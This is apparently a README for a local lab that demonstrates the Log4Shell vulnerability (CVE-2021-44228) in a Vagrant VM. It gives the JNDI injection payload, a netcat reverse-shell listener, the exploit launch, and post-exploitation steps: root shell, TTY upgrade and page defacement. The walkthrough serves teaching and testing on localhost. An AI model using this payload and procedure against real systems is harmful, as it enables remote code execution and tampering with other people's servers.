# Log4Shell PoC

rm_poc_log4shell

## PreReqs

- Windows system with minimum 8GB RAM
- Installed:
  - Visual Studio Code
  - git
  - virtualbox
  - vagrant
- download vulnerable [jdk-8u20](https://mega.nz/file/cFQF3SpC#U01e3y3L2f-_lYzL8s5a_x11C4n7IJYMbztS4x2mT-o)

## VM environment

1. clone repo: <https://github.com/ttgithg/rm_poc_log4shell>

    ```bash
    git clone git@github.com:ttgithg/rm_poc_log4shell
    ```

2. Put downloaded jdk-file in cloned github repo: `\rm_poc_log4shell\provisioning\files\log4jlab`

3. Open Visual Studio Code and open the cloned repo `rm_poc_log4shell` as a working folder

4. Open the root of `rm_poc_log4shell` in an Integrated Terminal

5. Check status: `vagrant status`

6. Create VM + provision: `vagrant up deblab`

    **Note**: In case of errors correct them and try provisioning again with: `vagrant provision deblab`

7. Connect with ssh: `vagrant ssh deblab`

## Lab environment

Open the deblab GUI and login with debuser.
We will need 3 terminals for this setup to manage a log4shell hack.
We open the browser on the localhost:8080 and past the given request: `${jndi:ldap://localhost:1389/a}`

### Summary

```bash
# Terminal1: netcat listener
nc -lvnp 9001

# Terminal2: Launch exploit
cd /log4jlab
sudo python3 poc.py --userip localhost --webport 8000 --lport 9001

# Terminal3: vulnerable application
cd /log4jlab
docker build -t log4j-shell-poc .
docker run --network host log4j-shell-poc

# browser: paste request: ${jndi:ldap://localhost:1389/a}
http://localhost:8080/
```

### Extended walkthrough

#### Terminal 1: netcat listener

```bash
┌──(debuser㉿deblab)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
```

#### Terminal 2: Launch exploit

```bash
┌──(debuser㉿deblab)-[/log4jlab]
└─$ cd /log4jlab/; ls
Dockerfile     jdk-8u20-linux-x64.tar.gz  requirements.txt
Exploit.class  LICENSE                    target
Exploit.java   poc.py                     vulnerable-application
jdk1.8.0_20    README.md

┌──(debuser㉿deblab)-[/log4jlab]
└─$ sudo python3 poc.py --userip localhost --webport 8000 --lport 9001       

[!] CVE: CVE-2021-44228                                                      
[!] Github repo: https://github.com/kozmer/log4j-shell-poc                   
                                                                             
[+] Exploit java class created success
[+] Setting up LDAP server
                                                                             
[+] Send me: ${jndi:ldap://localhost:1389/a}
                                                                             
[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Listening on 0.0.0.0:1389
```

#### Terminal 3: create vulnerable application

```bash
┌──(debuser㉿deblab)-[/log4jlab]
└─$ cd /log4jlab/

┌──(debuser㉿deblab)-[/log4jlab]
└─$ docker build -t log4j-shell-poc .
Sending build context to Docker daemon  574.8MB
Step 1/5 : FROM tomcat:8.0.36-jre8
8.0.36-jre8: Pulling from library/tomcat
8ad8b3f87b37: Pull complete 
751fe39c4d34: Pull complete 
b165e84cccc1: Pull complete 
acfcc7cbc59b: Pull complete 
04b7a9efc4af: Pull complete 
b16e55fe5285: Pull complete 
8c5cbb866b55: Pull complete 
96290882cd1b: Pull complete 
85852deeb719: Pull complete 
ff68ba87c7a1: Pull complete 
584acdc953da: Pull complete 
cbed1c54bbdf: Pull complete 
4f8389678fc5: Pull complete 
Digest: sha256:e6d667fbac9073af3f38c2d75e6195de6e7011bb9e4175f391e0e35382ef8d0d
Status: Downloaded newer image for tomcat:8.0.36-jre8
 ---> 945050cf462d
Step 2/5 : RUN rm -rf /usr/local/tomcat/webapps/*
 ---> Running in 118c9f3dab57
Removing intermediate container 118c9f3dab57
 ---> 0a7905e32954
Step 3/5 : ADD target/log4shell-1.0-SNAPSHOT.war /usr/local/tomcat/webapps/ROOT.war
 ---> c038eb1ce771
Step 4/5 : EXPOSE 8080
 ---> Running in e44c024ec983
Removing intermediate container e44c024ec983
 ---> 58cbb415ad3a
Step 5/5 : CMD ["catalina.sh", "run"]
 ---> Running in d10ead2ef23b
Removing intermediate container d10ead2ef23b
 ---> 989227232ea8
Successfully built 989227232ea8
Successfully tagged log4j-shell-poc:latest

┌──(debuser㉿deblab)-[/log4jlab]
└─$ docker run --network host log4j-shell-poc                                
25-Apr-2022 00:10:33.847 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version:        Apache Tomcat/8.0.36
25-Apr-2022 00:10:33.848 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Jun 9 2016 13:55:50 UTC
25-Apr-2022 00:10:33.848 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server number:         8.0.36.0
25-Apr-2022 00:10:33.848 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Name:               Linux
25-Apr-2022 00:10:33.848 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log OS Version:            5.10.0-kali3-amd64
25-Apr-2022 00:10:33.849 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Architecture:          amd64
25-Apr-2022 00:10:33.849 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             /usr/lib/jvm/java-8-openjdk-amd64/jre
25-Apr-2022 00:10:33.849 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Version:           1.8.0_102-8u102-b14.1-1~bpo8+1-b14
25-Apr-2022 00:10:33.849 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log JVM Vendor:            Oracle Corporation
25-Apr-2022 00:10:33.849 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_BASE:         /usr/local/tomcat
25-Apr-2022 00:10:33.849 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log CATALINA_HOME:         /usr/local/tomcat
25-Apr-2022 00:10:33.850 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties
25-Apr-2022 00:10:33.850 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
25-Apr-2022 00:10:33.850 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djdk.tls.ephemeralDHKeySize=2048
25-Apr-2022 00:10:33.850 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.endorsed.dirs=/usr/local/tomcat/endorsed
25-Apr-2022 00:10:33.850 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.base=/usr/local/tomcat
25-Apr-2022 00:10:33.851 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Dcatalina.home=/usr/local/tomcat
25-Apr-2022 00:10:33.851 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Command line argument: -Djava.io.tmpdir=/usr/local/tomcat/temp
25-Apr-2022 00:10:33.851 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent Loaded APR based Apache Tomcat Native library 1.2.7 using APR version 1.5.1.
25-Apr-2022 00:10:33.851 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR capabilities: IPv6 [true], sendfile [true], accept filters [false], random [true].
25-Apr-2022 00:10:33.855 INFO [main] org.apache.catalina.core.AprLifecycleListener.initializeSSL OpenSSL successfully initialized (OpenSSL 1.0.2h  3 May 2016)
25-Apr-2022 00:10:33.919 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["http-apr-8080"]
25-Apr-2022 00:10:33.929 INFO [main] org.apache.coyote.AbstractProtocol.init Initializing ProtocolHandler ["ajp-apr-8009"]
25-Apr-2022 00:10:33.930 INFO [main] org.apache.catalina.startup.Catalina.load Initialization processed in 380 ms
25-Apr-2022 00:10:33.947 INFO [main] org.apache.catalina.core.StandardService.startInternal Starting service Catalina
25-Apr-2022 00:10:33.947 INFO [main] org.apache.catalina.core.StandardEngine.startInternal Starting Servlet Engine: Apache Tomcat/8.0.36
25-Apr-2022 00:10:33.968 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployWAR Deploying web application archive /usr/local/tomcat/webapps/ROOT.war
25-Apr-2022 00:10:34.099 WARNING [localhost-startStop-1] org.apache.tomcat.util.descriptor.web.WebXml.setVersion Unknown version string [4.0]. Default version will be used.
25-Apr-2022 00:10:34.368 INFO [localhost-startStop-1] org.apache.jasper.servlet.TldScanner.scanJars At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
25-Apr-2022 00:10:34.389 INFO [localhost-startStop-1] org.apache.catalina.startup.HostConfig.deployWAR Deployment of web application archive /usr/local/tomcat/webapps/ROOT.war has finished in 420 ms
25-Apr-2022 00:10:34.390 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["http-apr-8080"]
25-Apr-2022 00:10:34.408 INFO [main] org.apache.coyote.AbstractProtocol.start Starting ProtocolHandler ["ajp-apr-8009"]
25-Apr-2022 00:10:34.409 INFO [main] org.apache.catalina.startup.Catalina.start Server startup in 478 ms
```

#### Browser

- Open URL: <http://localhost:8080/>
- paste `${jndi:ldap://localhost:1389/a}` in the `username` section
- press `login`

![poc log4shell](img/deblabimg/1.poc-log4shell.png)

The hack succeeded when the netcat listener gives:

```bash
┌──(debuser㉿deblab)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48496
```

### Hack along

You can check your access and log4shell

```bash
┌──(debuser㉿deblab)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48496
whoami
root
/usr/bin/script -qc /bin/bash /dev/null
root@deblab:/usr/local/tomcat# ^Z
[1]+  Stopped                 nc -lvnp 9001
┌──(debuser㉿deblab)-[~]
└─$ stty raw -echo; fg; reset
nc -lvnp 9001

root@deblab:/usr/local/tomcat# sed -i 's/Hello Again!/<<< LOG4SHELL PoC >>>/g' webapps/ROOT/index.jsp

root@deblab:/usr/local/tomcat# sed -i 's/Login/HACKED/g' webapps/ROOT/index.jsp

# Refresh browser ;-)
```

### References

- automated environment using vagrant with a [ansible skeleton](https://github.com/bertvv/ansible-skeleton) built by bertvv
- log4j CVE-2021-44228 poc [githubRepo](https://github.com/kozmer/log4j-shell-poc) built by kozer
- log4j CVE-2021-44228 testing tools [URL](https://log4shell.tools/) and [gitRepo](https://github.com/alexbakker/log4shell-tools) built by Alexander Bakker
